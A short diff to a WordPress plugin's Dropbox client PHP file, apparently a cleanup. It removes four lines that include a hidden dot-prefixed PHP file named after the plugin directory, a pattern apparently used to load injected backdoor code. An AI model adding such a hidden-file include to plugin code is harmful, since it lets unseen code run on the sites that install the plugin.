@@ -6,10 +6,6 @@
  * (c) WebFactory Ltd, 2015 - 2021
  */
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class WPRDropboxClient {
 	const API_URL = "https://api.dropboxapi.com/";
 	const API_CONTENT_URL = "https://content.dropboxapi.com/";
